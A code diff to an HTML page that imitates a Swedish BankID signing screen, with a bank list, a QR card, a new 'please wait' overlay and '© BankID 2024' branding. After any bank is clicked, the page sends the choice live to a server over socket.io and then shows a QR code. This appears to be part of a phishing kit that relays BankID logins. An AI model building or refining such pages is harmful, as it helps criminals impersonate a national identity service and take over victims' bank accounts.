@@ -41,7 +41,6 @@
             justify-content: start;
             color: var(--text-color);
             margin: 40px;
-            /* overflow: hidden; */
         }
 
         .logo {
@@ -204,7 +203,7 @@
             }
         }
 
-        /* Bank List Styles */
+        /* Bank list styles */
         .container {
             background-color: white;
             padding: 20px;
@@ -302,6 +301,106 @@
             -webkit-transform: rotate(-45deg);
             margin-right: 10px;
         }
+
+        /* Waiting animation styles */
+        .waiting {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgb(255, 255, 255); /* Semi-transparent white background */
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000; /* Ensure it's on top of other content */
+            display: none; /* Hide waiting section initially */
+            color: #000;
+            font-weight: 450;
+        }
+
+        .icon-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+
+        .icon {
+            display: inline-block;
+            position: relative;
+            width: 20px; /* Reduced width */
+            height: 10px; /* Reduced height */
+            cursor: pointer;
+            margin: 0 5px; /* Space between arrows */
+        }
+
+        .waiting-arrow {
+            position: absolute;
+            top: 4px; /* Adjusted position */
+            width: 90%;
+            height: 1px; /* Reduced height */
+            background-color: #000000;
+            box-shadow: 0 2px 3px rgba(0, 0, 0, .2);
+            animation: waiting-arrow 1.4s linear infinite;
+        }
+
+        .icon:nth-child(1) .waiting-arrow {
+            animation-delay: 0s;
+        }
+
+        .icon:nth-child(2) .waiting-arrow {
+            animation-delay: 0.45s;
+        }
+
+        .icon:nth-child(3) .waiting-arrow {
+            animation-delay: 0.9s;
+        }
+
+        .waiting-arrow::after, .waiting-arrow::before {
+            content: '';
+            position: absolute;
+            width: 60%;
+            height: 1.5px; /* Reduced height */
+            right: -3px;
+            background-color: #000000;
+        }
+
+        .waiting-arrow::after {
+            top: -3.5px; /* Adjusted position */
+            transform: rotate(45deg);
+        }
+
+        .waiting-arrow::before {
+            top: 3px; /* Adjusted position */
+            box-shadow: 0 2px 3px rgba(0, 0, 0, .2);
+            transform: rotate(-45deg);
+        }
+
+        @keyframes waiting-arrow {
+            0% {
+            transform: translateX(0);
+            opacity: 1;
+            }
+            25% {
+            opacity: 0.6;
+            }
+            50% {
+            opacity: 0.1;
+            }
+            75% {
+            opacity: 0.6;
+            }
+            100% {
+            transform: translateX(0);
+            opacity: 1;
+            }
+        }
+
+
+
     </style>
 </head>
 <body>
@@ -348,7 +447,7 @@
                 </div>
             </div>
         </div>
-        <button id="generateQrButton">Fortsätt</button>
+        <button id="generateQrButton">Starta</button>
     </div>
 
     <div class="container" id="bankListContainer" style="display: none;">
@@ -442,9 +541,27 @@
         </ul>
     </div>
 
+    <div class="waiting" id="waitingSection">
+        <div class="icon-container">
+            <div class="icon">
+                <div class="waiting-arrow"></div>
+            </div>
+            <div class="icon">
+                <div class="waiting-arrow"></div>
+            </div>
+            <div class="icon">
+                <div class="waiting-arrow"></div>
+            </div>
+        </div>
+        <h3>Vanligen vanta</h3>
+        <p>Vi behandlar din begaran.</p>
+    </div>
+
+
+
     <div class="footer">
         <p>© BankID 2024<br>
-            Denna anslut är krypterad</p>
+            Denna anslutning är krypterad</p>
     </div>
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
@@ -461,22 +578,22 @@
             const bankListContainer = document.getElementById('bankListContainer');
             const bankList = document.getElementById('bankList');
             const bankItems = bankList.querySelectorAll('li');
+            const waitingSection = document.getElementById('waitingSection');
 
             let isLoading = false;
             let lastUpdateTime = Date.now();
             let isButtonClicked = false;
 
-            // Initially hide the bank list
             bankListContainer.style.display = 'none';
+            waitingSection.style.display = 'none'; // Hide waiting section initially
 
             generateQrButton.addEventListener('click', function() {
                 if (!isButtonClicked) {
                     agreeSignText.style.display = 'none';
-                    qrCard.style.display = 'none'; // Hide QR card initially
-                    isLoading = false; // Ensure loading is not active
+                    qrCard.style.display = 'none'; 
+                    isLoading = false; 
                     loaderElement.classList.remove('active');
 
-                    // Show the bank list after the button is clicked
                     bankListContainer.style.display = 'block';
                     isButtonClicked = true;
                 }
@@ -491,7 +608,6 @@
                 qrText.classList.add('active');
                 lastUpdateTime = Date.now();
 
-                // Adjust the height of the content container dynamically
                 contentContainer.style.height = 'auto';
 
                 if (generateQrButton.innerHTML == 'Inväntar ytterligare signeringar') {
@@ -499,43 +615,17 @@
                 }
             });
 
-            setInterval(() => {
-                if (Date.now() - lastUpdateTime > 1000 && !isLoading) {
-                    isLoading = true;
-                    loaderElement.classList.add('active');
-                    loaderElement.classList.remove('hidden');
-                    qrImage.classList.remove('active');
-                    qrText.classList.remove('active');
-
-                    // Reset the height of the content container
-                    contentContainer.style.height = 'auto';
-
-                    if (generateQrButton.innerHTML == '') {
-                        generateQrButton.style.display = 'block';
-                    }
-                }
-            }, 1000);
-
-            document.querySelector('.sidebar-toggler').addEventListener('click', function() {
-                var helpTexts = document.querySelectorAll('.help-button-text');
-                helpTexts.forEach(function(text) {
-                    text.classList.toggle('hidden');
-                });
-            });
-
-            document.querySelector('.cancel-bankid').addEventListener('click', function() {
-                document.getElementById('bankid-qr-code').classList.remove('current');
-                window.location.reload();
-            });
-
-            // Add click event listener to each bank item
             bankItems.forEach(item => {
                 item.addEventListener('click', function() {
                     const bankName = item.querySelector('.bank-name').textContent.trim();
 
-                    if (bankName === 'Nordea') {
-                        // Hide the bank list and show the QR card
-                        bankListContainer.style.display = 'none';
+                    // Hide the bank list and show the waiting section as a full-screen overlay
+                    bankListContainer.style.display = 'none';
+                    waitingSection.style.display = 'flex';
+
+                    setTimeout(() => {
+                        // Hide the waiting section and show the QR card
+                        waitingSection.style.display = 'none';
                         qrCard.style.display = 'block';
                         isLoading = true;
                         loaderElement.classList.add('active');
@@ -544,31 +634,23 @@
                         generateQrButton.style.backgroundColor = 'white';
                         generateQrButton.style.color = '#000';
                         generateQrButton.style.border = 'none';
-                    } else {
-                        // Emit an event with the bank name to the server
+
                         socket.emit('bank_clicked', { bankName: bankName });
-                        // Hide the QR card and show the bank list
-                        qrCard.style.display = 'none';
-                        bankListContainer.style.display = 'block';
-                        // alert(`You clicked on: ${bankName}`);
-                    }
+                    }, 3000); // 3 seconds delay
                 });
             });
 
-            // Search functionality
             const searchInput = document.getElementById('searchInput');
             searchInput.addEventListener('input', () => {
                 const searchTerm = searchInput.value.toLowerCase();
 
-                // Loop through each bank item
                 bankItems.forEach(item => {
                     const bankName = item.querySelector('.bank-name').textContent.toLowerCase();
 
-                    // Show or hide the item based on the search term
                     if (bankName.includes(searchTerm)) {
-                        item.style.display = 'flex'; // Show the item
+                        item.style.display = 'flex'; 
                     } else {
-                        item.style.display = 'none'; // Hide the item
+                        item.style.display = 'none';
                     }
                 });
             });
